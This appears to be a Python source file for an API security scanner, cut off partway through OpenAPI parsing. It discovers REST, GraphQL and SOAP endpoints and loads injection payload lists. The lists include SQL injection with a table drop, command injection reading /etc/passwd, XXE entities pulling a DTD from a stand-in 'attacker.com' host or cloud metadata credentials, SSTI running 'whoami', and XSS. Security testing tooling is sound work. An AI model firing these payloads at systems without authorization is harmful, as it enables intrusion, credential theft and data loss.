# ============================================================================
# ADVANCED API SECURITY TESTING FRAMEWORK
# ============================================================================
# Class: AdvancedAPISecurityAnalyzer
# Purpose: Comprehensive API security testing with protocol support,
#          automated vulnerability detection, and business logic testing
# ============================================================================

import os
import re
import json
import yaml
import time
import random
import hashlib
import base64
import xml.etree.ElementTree as ET
from datetime import datetime, timedelta
from typing import Optional, List, Dict, Tuple, Union, Any, Set
from dataclasses import dataclass, field
from enum import Enum
from collections import defaultdict, Counter
import requests
from urllib.parse import urljoin, urlparse, parse_qs, quote, unquote
import concurrent.futures
import threading
from logger import logger
from colorama import Fore, Style, init

# Initialize colorama (safe on Windows)
init(autoreset=True)

# Security testing libraries
try:
    import jwt
    JWT_AVAILABLE = True
except ImportError:
    JWT_AVAILABLE = False

try:
    import graphql
    import graphql.language.ast as ast
    GRAPHQL_AVAILABLE = True
except ImportError:
    GRAPHQL_AVAILABLE = False

class APIType(Enum):
    """Enum for API types."""
    REST = "rest_api"
    GRAPHQL = "graphql"
    SOAP = "soap"
    GRPC = "grpc"
    WEBSOCKET = "websocket"
    WEBHOOK = "webhook"
    OPENAPI = "openapi"
    GRAPHQL_SUBSCRIPTION = "graphql_subscription"
    RPC = "rpc"
    CUSTOM = "custom"

class APIVulnerability(Enum):
    """Enum for API vulnerabilities."""
    BROKEN_OBJECT_LEVEL_AUTHORIZATION = "bola"
    BROKEN_USER_AUTHENTICATION = "broken_auth"
    EXCESSIVE_DATA_EXPOSURE = "excessive_data"
    LACK_OF_RESOURCES_RATE_LIMITING = "no_rate_limit"
    BROKEN_FUNCTION_LEVEL_AUTHORIZATION = "bfa"
    MASS_ASSIGNMENT = "mass_assignment"
    SECURITY_MISCONFIGURATION = "security_misconfig"
    INJECTION = "injection"
    IMPROPER_ASSET_MANAGEMENT = "asset_mgmt"
    INSECURE_DESIGN = "insecure_design"
    GRAPHQL_INTROSPECTION_ENABLED = "graphql_introspection"
    GRAPHQL_BATCHING_ATTACK = "graphql_batching"
    GRAPHQL_DEPTH_ATTACK = "graphql_depth"
    GRAPHQL_ALIAS_OVERLOADING = "graphql_alias"
    SOAP_ACTION_SPOOFING = "soap_action_spoofing"
    SOAP_XXE = "soap_xxe"
    API_KEY_LEAKAGE = "api_key_leak"
    JWT_WEAKNESSES = "jwt_weakness"
    CORS_MISCONFIGURATION = "cors_misconfig"
    SSRF_VIA_API = "api_ssrf"
    IDOR = "idor"
    BUSINESS_LOGIC_FLAW = "business_logic"
    INFORMATION_DISCLOSURE = "info_disclosure"
    DENIAL_OF_SERVICE = "dos"

@dataclass
class APIEndpoint:
    """API endpoint metadata."""
    url: str
    method: str
    status_code: int
    api_type: APIType
    parameters: List[Dict[str, Any]]
    headers: Dict[str, str]
    response_time: float
    response_size: int
    requires_auth: bool
    auth_type: str = ""
    rate_limit_info: Dict[str, Any] = field(default_factory=dict)
    openapi_spec: Optional[Dict] = None
    graphql_schema: Optional[Dict] = None

@dataclass
class APITestResult:
    """API security test result."""
    endpoint: str
    test_type: str
    vulnerability: APIVulnerability
    severity: str
    confidence: float
    evidence: str
    description: str
    remediation: str
    request_data: Dict[str, Any]
    response_data: Dict[str, Any]

@dataclass
class APISecurityReport:
    """Comprehensive API security report."""
    target: str
    scan_date: datetime
    endpoints_tested: int
    vulnerabilities_found: int
    risk_score: float
    risk_level: str
    test_results: List[APITestResult]
    recommendations: List[str]
    top_vulnerabilities: List[Dict[str, Any]]

class AdvancedAPISecurityAnalyzer:
    """
    Advanced API security testing framework with comprehensive vulnerability detection.
    
    Features:
    1. Multi-protocol API discovery (REST, GraphQL, SOAP, gRPC, WebSocket)
    2. Automated vulnerability scanning for OWASP API Security Top 10
    3. GraphQL-specific security testing
    4. Business logic testing and IDOR detection
    5. Rate limiting and DoS testing
    6. Authentication and authorization testing
    7. Automated fuzzing with intelligent payloads
    8. API documentation analysis (OpenAPI/Swagger)
    9. Real-time risk scoring and reporting
    10. Parallel scanning capabilities
    
    Supported API Protocols:
    - REST APIs
    - GraphQL (queries, mutations, subscriptions)
    - SOAP Web Services
    - gRPC (partial support via reflection)
    - WebSocket APIs
    - WebHooks
    - RPC-style APIs
    """
    
    def __init__(self,
                 max_concurrent_scans: int = 5,
                 enable_fuzzing: bool = True,
                 fuzzing_intensity: str = "medium",  # low, medium, high
                 enable_rate_limit_testing: bool = True,
                 enable_business_logic_tests: bool = True,
                 custom_auth_tokens: Dict[str, str] = None,
                 timeout_seconds: int = 30):
        
        self.max_concurrent_scans = max_concurrent_scans
        self.enable_fuzzing = enable_fuzzing
        self.fuzzing_intensity = fuzzing_intensity
        self.enable_rate_limit_testing = enable_rate_limit_testing
        self.enable_business_logic_tests = enable_business_logic_tests
        self.custom_auth_tokens = custom_auth_tokens or {}
        self.timeout_seconds = timeout_seconds
        
        # API discovery patterns
        self.api_patterns = self._initialize_api_patterns()
        self.common_api_paths = self._load_api_paths_database()
        self.api_keywords = self._load_api_keywords()
        
        # Payload databases
        self.injection_payloads = self._load_injection_payloads()
        self.fuzzing_payloads = self._load_fuzzing_payloads()
        self.graphql_payloads = self._load_graphql_payloads()
        self.soap_payloads = self._load_soap_payloads()
        
        # Testing configurations
        self.test_configs = self._initialize_test_configurations()
        self.severity_weights = self._initialize_severity_weights()
        
        # State management
        self.discovered_endpoints: List[APIEndpoint] = []
        self.test_results: List[APITestResult] = []
        self.session_cache: Dict[str, requests.Session] = {}
        self.rate_limit_trackers: Dict[str, Dict[str, Any]] = {}
        
        # Threading and concurrency
        self.executor = concurrent.futures.ThreadPoolExecutor(max_workers=max_concurrent_scans)
        self.scan_lock = threading.Lock()
        
        # Statistics
        self.scan_statistics = defaultdict(int)
        
        logger.info(f"AdvancedAPISecurityAnalyzer initialized with {max_concurrent_scans} concurrent workers")
    
    def _initialize_api_patterns(self) -> Dict[str, re.Pattern]:
        """Initialize comprehensive API pattern detection."""
        return {
            'rest': re.compile(r'/api/v[0-9]+/|/rest/|/v[0-9]/|/endpoint/|/resource/', re.I),
            'graphql': re.compile(r'/graphql|/gql|/query|/graphql/v[0-9]', re.I),
            'soap': re.compile(r'\.(asmx|wsdl|svc)$|/soap/|/ws/|/webservice/', re.I),
            'grpc': re.compile(r'/grpc\.|/grpc/|\.pb$|/grpc-reflect/', re.I),
            'websocket': re.compile(r'/ws/|/wss/|/socket\.io|/websocket', re.I),
            'webhook': re.compile(r'/webhook|/callback|/hook|/notify', re.I),
            'openapi': re.compile(r'/swagger|/openapi|/api-docs|/docs/api', re.I),
            'rpc': re.compile(r'/rpc/|/json-rpc|/xml-rpc|/remote/', re.I),
            'admin': re.compile(r'/admin/api|/manage/api|/internal/api', re.I),
            'auth': re.compile(r'/auth/|/oauth/|/token|/login/api', re.I),
        }
    
    def _load_api_paths_database(self) -> List[str]:
        """Load comprehensive API paths database."""
        paths = [
            # REST API patterns
            '/api/', '/api/v1/', '/api/v2/', '/api/v3/', '/api/v4/', '/api/v5/',
            '/rest/', '/rest/v1/', '/rest/v2/', '/rest/v3/',
            '/v1/', '/v2/', '/v3/', '/version1/', '/version2/',
            '/endpoint/', '/resource/', '/service/', '/services/',
            
            # GraphQL
            '/graphql', '/graphql/', '/graphql/v1', '/graphql/v2',
            '/gql', '/gql/', '/query', '/query/',
            '/graphql-api', '/gql-api',
            
            # SOAP
            '/soap/', '/soap/v1', '/soap/v2',
            '/ws/', '/ws/v1', '/ws/v2',
            '/webservice/', '/webservice/v1',
            '.asmx', '.wsdl', '.svc',
            
            # gRPC (common paths)
            '/grpc/', '/grpc.health.v1.Health/Check',
            '/grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo',
            
            # WebSocket
            '/ws', '/wss', '/socket.io', '/websocket',
            '/ws/', '/wss/', '/socket.io/',
            
            # Webhooks
            '/webhook', '/webhook/', '/webhooks/', '/callback/',
            '/hook', '/hooks/', '/notify', '/notification/',
            
            # Documentation
            '/swagger', '/swagger-ui', '/swagger/v1',
            '/openapi', '/openapi.json', '/openapi.yaml',
            '/api-docs', '/docs/api', '/apidocs',
            '/redoc', '/redocly',
            
            # Authentication
            '/oauth/', '/oauth2/', '/auth/', '/authentication/',
            '/token', '/token/', '/authorize', '/authorization/',
            '/login', '/login/api', '/signin',
            
            # Common resources
            '/users', '/users/', '/user/', '/account/', '/accounts/',
            '/products', '/products/', '/items/', '/catalog/',
            '/orders', '/orders/', '/cart/', '/checkout/',
            '/payments', '/payments/', '/invoices/', '/billing/',
            '/admin', '/admin/', '/manage/', '/dashboard/',
            '/config', '/config/', '/settings/', '/preferences/',
            '/search', '/search/', '/query/', '/filter/',
            '/upload', '/upload/', '/files/', '/documents/',
            '/reports', '/reports/', '/analytics/', '/metrics/',
            
            # Mobile/SPA specific
            '/mobile/api', '/mobile/v1', '/app/api', '/app/v1',
            '/spa/api', '/spa/v1', '/client/api',
            
            # Internal/development
            '/internal/', '/internal/api', '/dev/', '/dev/api',
            '/staging/', '/staging/api', '/test/', '/test/api',
            '/debug/', '/debug/api', '/monitoring/', '/status/',
        ]
        
        # Add variations with common HTTP methods
        method_variations = []
        for path in paths:
            if not path.endswith('/'):
                method_variations.append(path + '/')
        
        paths.extend(method_variations)
        
        return list(set(paths))
    
    def _load_api_keywords(self) -> Dict[str, List[str]]:
        """Load API-related keywords for content analysis."""
        return {
            'rest': ['api', 'endpoint', 'resource', 'collection', 'v1', 'v2', 'rest'],
            'graphql': ['graphql', 'query', 'mutation', 'subscription', 'schema', '__typename'],
            'soap': ['soap', 'wsdl', 'xml', 'envelope', 'body', 'header'],
            'json': ['{', '}', '"', ':', 'json', 'application/json'],
            'xml': ['<?xml', '<soap:', '<wsdl:', '<xsd:', 'xmlns='],
            'error': ['error', 'exception', 'failed', 'invalid', 'unauthorized'],
            'auth': ['token', 'bearer', 'apikey', 'oauth', 'jwt', 'authorization'],
            'pagination': ['page', 'limit', 'offset', 'cursor', 'next', 'previous'],
            'search': ['search', 'filter', 'sort', 'order', 'q', 'query'],
        }
    
    def _load_injection_payloads(self) -> Dict[str, List[str]]:
        """Load injection payloads for API testing."""
        return {
            'sql_injection': [
                "' OR '1'='1",
                "' UNION SELECT NULL--",
                "1' AND SLEEP(5)--",
                "admin'--",
                "' OR 'a'='a",
                "'; DROP TABLE users--",
                "' OR 1=1--",
                "' OR '1'='1'--",
                "' OR '1'='1'/*",
                "admin' OR '1'='1",
                "\" OR \"1\"=\"1",
                "' OR 'x'='x",
                "' HAVING 1=1--",
                "' GROUP BY columnnames having 1=1--",
                "' UNION SELECT @@version--",
                "1' AND 1=(SELECT COUNT(*) FROM tablenames)--",
                "' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
                "' OR (SELECT COUNT(*) FROM users) > 0--",
            ],
            'nosql_injection': [
                {"$where": "1 == 1"},
                {"$ne": "admin"},
                {"$gt": ""},
                {"$regex": ".*"},
                {"$exists": True},
                {"$type": "string"},
                {"$in": ["admin", "user"]},
                {"$nin": ["guest"]},
                {"$or": [{"username": "admin"}, {"username": {"$exists": True}}]},
                {"$and": [{"username": "admin"}, {"password": {"$ne": ""}}]},
            ],
            'command_injection': [
                "; ls -la",
                "| cat /etc/passwd",
                "`whoami`",
                "$(id)",
                "|| ps aux",
                "&& netstat -an",
                "'; echo test; #",
                "\" && echo test",
                "| wc -l",
                "; ping -c 1 localhost",
            ],
            'path_traversal': [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\win.ini",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "....//....//....//etc/passwd",
                "..;/..;/..;/etc/passwd",
                "..%252f..%252f..%252fetc%252fpasswd",
                "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
                "/etc/passwd%00",
                "\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            ],
            'xxe': [
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]><root>&xxe;</root>',
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>',
                '<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe; ]>',
                '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            ],
            'ssti': [
                "{{7*7}}",
                "${7*7}",
                "<%= 7*7 %>",
                "${{7*7}}",
                "@(7*7)",
                "#{7*7}",
                "*{7*7}",
                "{{config}}",
                "${T(java.lang.Runtime).getRuntime().exec('whoami')}",
                "<%= system('whoami') %>",
            ],
            'xss': [
                "<script>alert(1)</script>",
                "\"><script>alert(1)</script>",
                "'><script>alert(1)</script>",
                "\"><img src=x onerror=alert(1)>",
                "javascript:alert(1)",
                "onmouseover=alert(1)",
                "onload=alert(1)",
                "onerror=alert(1)",
                "svg/onload=alert(1)",
                "body{background-image:url('javascript:alert(1)')}",
            ],
        }
    
    def _load_fuzzing_payloads(self) -> Dict[str, List[Any]]:
        """Load fuzzing payloads for API parameter testing."""
        return {
            'boundary_values': [
                -1, 0, 1, 999999999, -999999999,
                2147483647, -2147483648,  # INT_MAX, INT_MIN
                4294967295,  # UINT_MAX
                9223372036854775807, -9223372036854775808,  # LONG_MAX, LONG_MIN
                1.7976931348623157e+308, 2.2250738585072014e-308,  # Double limits
                float('inf'), float('-inf'), float('nan'),
            ],
            'special_strings': [
                "", " ", "\t", "\n", "\r\n", "\0",
                "NULL", "null", "None", "undefined",
                "true", "false", "True", "False",
                "NaN", "Infinity", "-Infinity",
                "\"", "'", "`", "\\", "\\\\",
                "%00", "%0a", "%0d", "%09",
                "../../", "..\\",
                "<", ">", "&", "\"", "'",
                "<!--", "-->", "/*", "*/", "//",
                "||", "&&", "!", "~",
                "${}", "#{}", "@{}", "%{}",
            ],
            'data_types': [
                [], {}, [{}], {"": ""}, {"key": []},
                {"key": {}}, {"key": {"nested": "value"}},
                [1, 2, 3], ["a", "b", "c"],
                "", 0, False, None,
                b"", bytearray(), [],
            ],
            'format_strings': [
                "%s", "%n", "%x", "%p", "%d",
                "%s%s%s%s%s", "%n%n%n%n%n",
                "%99999999s", "%08x", "%p%p%p%p",
                "%.1024d", "%*.*s",
            ],
            'regex_dos': [
                "aaaaaaaaaaaaaaaaaaaaaaaaaaaaa!",
                "a" * 1000,
                "a" * 10000,
                "(a+)+", "([a-zA-Z]+)*", "(a|aa)+",
                "^(a+)+$", "(a|a?)+", "(a|a|a)+",
            ],
            'jwt_tampering': [
                {"alg": "none"},
                {"alg": "HS256", "kid": "../../../etc/passwd"},
                {"alg": "RS256", "kid": "https://attacker.com/key.pem"},
                {"alg": "HS256", "typ": "JWT"},
            ],
        }
    
    def _load_graphql_payloads(self) -> Dict[str, List[str]]:
        """Load GraphQL-specific payloads."""
        return {
            'introspection': ['''
                query IntrospectionQuery {
                    __schema {
                        queryType { name }
                        mutationType { name }
                        subscriptionType { name }
                        types { ...FullType }
                        directives { name description locations args { ...InputValue } }
                    }
                }
                fragment FullType on __Type {
                    kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason }
                    inputFields { ...InputValue }
                    interfaces { ...TypeRef }
                    enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason }
                    possibleTypes { ...TypeRef }
                }
                fragment InputValue on __InputValue {
                    name description type { ...TypeRef } defaultValue
                }
                fragment TypeRef on __Type {
                    kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } }
                }
            '''],
            'deep_query': [
                self._generate_graphql_depth_query(10),
                self._generate_graphql_depth_query(20),
                self._generate_graphql_depth_query(50),
            ],
            'alias_overloading': [
                self._generate_graphql_alias_query(100),
                self._generate_graphql_alias_query(500),
                self._generate_graphql_alias_query(1000),
            ],
            'batch_queries': [
                [{"query": "query { __typename }"}, {"query": "query { __schema { queryType { name } } }"}],
                [{"query": "query { users { id name } }"} for _ in range(10)],
                [{"query": "mutation { createUser(input: {name: \"test\"}) { id } }"} for _ in range(5)],
            ],
            'field_duplication': [
                self._generate_graphql_field_duplication(10),
                self._generate_graphql_field_duplication(50),
                self._generate_graphql_field_duplication(100),
            ],
        }
    
    def _load_soap_payloads(self) -> Dict[str, List[str]]:
        """Load SOAP-specific payloads."""
        return {
            'xxe': [
                '''<?xml version="1.0"?>
                <!DOCTYPE foo [
                <!ELEMENT foo ANY>
                <!ENTITY xxe SYSTEM "file:///etc/passwd">
                ]>
                <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
                  <soap:Body>
                    <foo>&xxe;</foo>
                  </soap:Body>
                </soap:Envelope>''',
                '''<?xml version="1.0"?>
                <!DOCTYPE foo [
                <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
                %xxe;
                ]>
                <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
                  <soap:Body>
                    <foo>test</foo>
                  </soap:Body>
                </soap:Envelope>''',
            ],
            'sql_injection': [
                '''<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
                  <soap:Body>
                    <GetUser>
                      <id>' OR '1'='1</id>
                    </GetUser>
                  </soap:Body>
                </soap:Envelope>''',
            ],
            'command_injection': [
                '''<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
                  <soap:Body>
                    <ExecuteCommand>
                      <command>; ls -la</command>
                    </ExecuteCommand>
                  </soap:Body>
                </soap:Envelope>''',
            ],
        }
    
    def _initialize_test_configurations(self) -> Dict[str, Dict[str, Any]]:
        """Initialize test configurations."""
        return {
            'injection_tests': {
                'enabled': True,
                'types': ['sql', 'nosql', 'command', 'xxe', 'ssti', 'xss'],
                'max_payloads': 10,
                'severity': 'High',
            },
            'auth_tests': {
                'enabled': True,
                'tests': ['jwt', 'api_key', 'oauth', 'basic_auth'],
                'severity': 'Critical',
            },
            'rate_limit_tests': {
                'enabled': self.enable_rate_limit_testing,
                'requests_per_second': 10,
                'duration_seconds': 30,
                'severity': 'Medium',
            },
            'graphql_tests': {
                'enabled': GRAPHQL_AVAILABLE,
                'tests': ['introspection', 'depth', 'aliases', 'batching', 'dos'],
                'severity': 'High',
            },
            'soap_tests': {
                'enabled': True,
                'tests': ['xxe', 'injection', 'wsdl'],
                'severity': 'High',
            },
            'idor_tests': {
                'enabled': self.enable_business_logic_tests,
                'severity': 'High',
            },
            'cors_tests': {
                'enabled': True,
                'severity': 'Medium',
            },
            'mass_assignment': {
                'enabled': True,
                'severity': 'Medium',
            },
            'info_disclosure': {
                'enabled': True,
                'severity': 'Low',
            },
            'dos_tests': {
                'enabled': True,
                'severity': 'Medium',
            },
        }
    
    def _initialize_severity_weights(self) -> Dict[str, float]:
        """Initialize severity weights for risk scoring."""
        return {
            'Critical': 10.0,
            'High': 7.5,
            'Medium': 5.0,
            'Low': 2.5,
            'Informational': 1.0,
        }
    
    def discover_api_endpoints_comprehensive(self, base_url: str) -> List[APIEndpoint]:
        """
        Comprehensive API endpoint discovery.
        
        Techniques:
        1. Common path brute-forcing
        2. Documentation parsing (OpenAPI, WSDL)
        3. JavaScript file analysis
        4. Sitemap/robots.txt analysis
        5. Response content analysis
        6. Header analysis
        7. Parameter discovery
        """
        endpoints = []
        discovered_urls = set()
        
        logger.info(f"Starting comprehensive API discovery for {base_url}")
        
        # Method 1: Common path brute-forcing
        common_path_endpoints = self._discover_via_common_paths(base_url)
        for endpoint in common_path_endpoints:
            if endpoint.url not in discovered_urls:
                endpoints.append(endpoint)
                discovered_urls.add(endpoint.url)
        
        # Method 2: Documentation parsing
        doc_endpoints = self._discover_via_documentation(base_url)
        for endpoint in doc_endpoints:
            if endpoint.url not in discovered_urls:
                endpoints.append(endpoint)
                discovered_urls.add(endpoint.url)
        
        # Method 3: JavaScript file analysis
        js_endpoints = self._discover_via_javascript(base_url)
        for endpoint in js_endpoints:
            if endpoint.url not in discovered_urls:
                endpoints.append(endpoint)
                discovered_urls.add(endpoint.url)
        
        # Method 4: Sitemap/robots.txt analysis
        sitemap_endpoints = self._discover_via_sitemap(base_url)
        for endpoint in sitemap_endpoints:
            if endpoint.url not in discovered_urls:
                endpoints.append(endpoint)
                discovered_urls.add(endpoint.url)
        
        # Method 5: Response content analysis
        content_endpoints = self._discover_via_content_analysis(base_url)
        for endpoint in content_endpoints:
            if endpoint.url not in discovered_urls:
                endpoints.append(endpoint)
                discovered_urls.add(endpoint.url)
        
        # Method 6: Parameter discovery
        param_endpoints = self._discover_via_parameter_analysis(endpoints)
        endpoints.extend(param_endpoints)
        
        logger.info(f"Discovered {len(endpoints)} API endpoints")
        
        return endpoints
    
    def _discover_via_common_paths(self, base_url: str) -> List[APIEndpoint]:
        """Discover API endpoints via common path brute-forcing."""
        endpoints = []
        
        logger.info("Discovering API endpoints via common paths")
        
        # Use thread pool for concurrent scanning
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_concurrent_scans) as executor:
            future_to_path = {}
            
            for path in self.common_api_paths[:100]:  # Limit to 100 paths for initial scan
                url = urljoin(base_url, path)
                future = executor.submit(self._probe_api_endpoint, url)
                future_to_path[future] = url
            
            for future in concurrent.futures.as_completed(future_to_path):
                url = future_to_path[future]
                try:
                    result = future.result(timeout=10)
                    if result:
                        endpoints.append(result)
                except Exception as e:
                    logger.debug(f"Probing failed for {url}: {e}")
        
        return endpoints
    
    def _probe_api_endpoint(self, url: str) -> Optional[APIEndpoint]:
        """Probe a single URL for API endpoint characteristics."""
        try:
            # Try different HTTP methods
            for method in ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS']:
                try:
                    start_time = time.time()
                    
                    headers = {
                        'User-Agent': 'Advanced-API-Scanner/1.0',
                        'Accept': 'application/json, application/xml, text/xml, */*',
                        'Accept-Encoding': 'gzip, deflate',
                    }
                    
                    # Add authentication if available
                    if self.custom_auth_tokens:
                        headers.update(self.custom_auth_tokens)
                    
                    if method in ['POST', 'PUT']:
                        response = requests.request(
                            method,
                            url,
                            headers=headers,
                            timeout=10,
                            verify=False,
                            allow_redirects=False,
                            data=json.dumps({"test": "data"})  # Minimal test payload
                        )
                    else:
                        response = requests.request(
                            method,
                            url,
                            headers=headers,
                            timeout=10,
                            verify=False,
                            allow_redirects=False
                        )
                    
                    response_time = time.time() - start_time
                    
                    # Check if this is an API endpoint
                    is_api, api_type = self._analyze_api_response(response, url)
                    
                    if is_api:
                        # Extract parameters from URL and response
                        parameters = self._extract_parameters(url, response)
                        
                        # Check authentication requirements
                        requires_auth = self._requires_authentication(response)
                        
                        endpoint = APIEndpoint(
                            url=url,
                            method=method,
                            status_code=response.status_code,
                            api_type=api_type,
                            parameters=parameters,
                            headers=dict(response.headers),
                            response_time=response_time,
                            response_size=len(response.content),
                            requires_auth=requires_auth,
                            auth_type=self._detect_auth_type(response),
                            rate_limit_info=self._extract_rate_limit_info(response.headers),
                        )
                        
                        # Parse OpenAPI/Swagger if found
                        if api_type == APIType.OPENAPI:
                            endpoint.openapi_spec = self._parse_openapi_spec(response.text)
                        
                        # Parse GraphQL schema if found
                        if api_type == APIType.GRAPHQL:
                            endpoint.graphql_schema = self._parse_graphql_schema(response.text)
                        
                        return endpoint
                
                except requests.RequestException:
                    continue
                except Exception as e:
                    logger.debug(f"Probe failed for {url} with method {method}: {e}")
        
        except Exception as e:
            logger.debug(f"Endpoint probing failed for {url}: {e}")
        
        return None
    
    def _analyze_api_response(self, response: requests.Response, url: str) -> Tuple[bool, APIType]:
        """Analyze response to determine if it's an API endpoint and its type."""
        content_type = response.headers.get('content-type', '').lower()
        content = response.text.lower()
        url_lower = url.lower()
        
        # Check for GraphQL
        if 'graphql' in content_type or 'graphql' in url_lower or '"data"' in content or '"errors"' in content:
            return True, APIType.GRAPHQL
        
        # Check for OpenAPI/Swagger
        if 'swagger' in content or 'openapi' in content:
            return True, APIType.OPENAPI
        
        # Check for SOAP/WSDL
        if 'soap' in content_type or 'wsdl' in content or 'soap' in url_lower or 'wsdl' in url_lower:
            return True, APIType.SOAP
        
        # Check for gRPC
        if 'grpc' in url_lower or 'application/grpc' in content_type:
            return True, APIType.GRPC
        
        # Check for WebSocket
        if 'websocket' in url_lower or 'upgrade: websocket' in response.headers.get('upgrade', '').lower():
            return True, APIType.WEBSOCKET
        
        # Check for JSON API
        if 'application/json' in content_type or content.strip().startswith(('{', '[')):
            return True, APIType.REST
        
        # Check for XML API
        if 'application/xml' in content_type or 'text/xml' in content_type or content.strip().startswith('<?xml'):
            return True, APIType.REST
        
        # Check URL patterns
        for pattern_name, pattern in self.api_patterns.items():
            if pattern.search(url):
                return True, APIType.REST  # Default to REST for now
        
        # Check for API keywords in response
        api_keywords = ['api', 'endpoint', 'resource', 'v1', 'v2', 'rest', 'method']
        if any(keyword in content for keyword in api_keywords):
            return True, APIType.REST
        
        return False, APIType.CUSTOM
    
    def _extract_parameters(self, url: str, response: requests.Response) -> List[Dict[str, Any]]:
        """Extract parameters from URL and response."""
        parameters = []
        
        # Extract from URL query parameters
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        for param_name, param_values in query_params.items():
            parameters.append({
                'name': param_name,
                'location': 'query',
                'type': 'string',
                'values': param_values,
                'required': False,
            })
        
        # Extract from JSON response (if it's an OpenAPI spec)
        if response.headers.get('content-type', '').startswith('application/json'):
            try:
                data = response.json()
                
                # Check if this is OpenAPI spec
                if isinstance(data, dict) and ('openapi' in data or 'swagger' in data):
                    if 'paths' in data:
                        for path, methods in data['paths'].items():
                            for method, details in methods.items():
                                if 'parameters' in details:
                                    for param in details['parameters']:
                                        parameters.append({
                                            'name': param.get('name', ''),
                                            'location': param.get('in', 'query'),
                                            'type': param.get('type', 'string'),
                                            'required': param.get('required', False),
                                            'source': 'openapi',
                                            'path': path,
                                            'method': method.upper(),
                                        })
                
                # Check for GraphQL schema
                elif 'data' in data and '__schema' in data['data']:
                    schema = data['data']['__schema']
                    if 'types' in schema:
                        for type_info in schema['types']:
                            if 'fields' in type_info:
                                for field in type_info['fields']:
                                    if 'args' in field:
                                        for arg in field['args']:
                                            parameters.append({
                                                'name': arg.get('name', ''),
                                                'location': 'graphql',
                                                'type': self._extract_graphql_type(arg.get('type', {})),
                                                'required': True,  # GraphQL args are required by default
                                                'source': 'graphql',
                                                'parent_type': type_info.get('name', ''),
                                                'field': field.get('name', ''),
                                            })
            
            except (json.JSONDecodeError, KeyError):
                pass
        
        # Extract from HTML forms (for SOAP/RPC)
        if '<form' in response.text.lower():
            soup = None
            try:
                from bs4 import BeautifulSoup
                soup = BeautifulSoup(response.text, 'html.parser')
            except ImportError:
                pass
            
            if soup:
                forms = soup.find_all('form')
                for form in forms:
                    inputs = form.find_all('input')
                    for input_tag in inputs:
                        param_name = input_tag.get('name')
                        if param_name:
                            parameters.append({
                                'name': param_name,
                                'location': 'form',
                                'type': input_tag.get('type', 'text'),
                                'required': 'required' in input_tag.attrs,
                                'source': 'html_form',
                            })
        
        return parameters
    
    def _extract_graphql_type(self, type_info: Dict) -> str:
        """Extract GraphQL type from type information."""
        if not isinstance(type_info, dict):
            return str(type_info)
        
        if 'name' in type_info:
            return type_info['name']
        elif 'ofType' in type_info:
            return self._extract_graphql_type(type_info['ofType'])
        else:
            return 'unknown'
    
    def _requires_authentication(self, response: requests.Response) -> bool:
        """Determine if endpoint requires authentication."""
        status = response.status_code
        
        # Common authentication-related status codes
        auth_status_codes = [401, 403]
        if status in auth_status_codes:
            return True
        
        # Check for WWW-Authenticate header
        if 'www-authenticate' in response.headers:
            return True
        
        # Check for authentication in response body
        auth_keywords = ['unauthorized', 'forbidden', 'login', 'authenticate', 'token']
        response_lower = response.text.lower()
        if any(keyword in response_lower for keyword in auth_keywords):
            return True
        
        return False
    
    def _detect_auth_type(self, response: requests.Response) -> str:
        """Detect authentication type from response."""
        headers = {k.lower(): v for k, v in response.headers.items()}
        
        if 'www-authenticate' in headers:
            auth_header = headers['www-authenticate']
            if 'bearer' in auth_header.lower():
                return 'bearer_token'
            elif 'basic' in auth_header.lower():
                return 'basic_auth'
            elif 'digest' in auth_header.lower():
                return 'digest_auth'
        
        # Check for JWT tokens
        if 'authorization' in headers and 'bearer' in headers['authorization'].lower():
            return 'jwt'
        
        # Check for API key patterns
        if any(key in str(headers).lower() for key in ['api-key', 'apikey', 'x-api-key']):
            return 'api_key'
        
        # Check for OAuth
        if 'oauth' in str(headers).lower() or 'token' in response.text.lower():
            return 'oauth'
        
        return 'unknown'
    
    def _extract_rate_limit_info(self, headers: Dict[str, str]) -> Dict[str, Any]:
        """Extract rate limiting information from headers."""
        rate_limit_info = {}
        
        rate_limit_headers = {
            'x-ratelimit-limit': 'limit',
            'x-ratelimit-remaining': 'remaining',
            'x-ratelimit-reset': 'reset',
            'x-ratelimit-window': 'window',
            'retry-after': 'retry_after',
        }
        
        for header_key, info_key in rate_limit_headers.items():
            if header_key in headers:
                rate_limit_info[info_key] = headers[header_key]
        
        return rate_limit_info
    
    def _parse_openapi_spec(self, content: str) -> Optional[Dict]:
        """Parse OpenAPI specification."""
        try:
            # Try JSON first
            if content.strip().startswith('{'):
                return json.loads(content)
            
            # Try YAML
            if 'swagger' in content.lower() or 'openapi' in content.lower():
                try:
                    return yaml.safe_load(content)
                except (yaml.YAMLError, ImportError):
                    pass
            
            # Try to extract JSON from JavaScript
            json_pattern = r'var spec = ({.*?});'
            match = re.search(json_pattern, content, re.DOTALL)
            if match:
                return json.loads(match.group(1))
        
        except (json.JSONDecodeError, KeyError, AttributeError) as e:
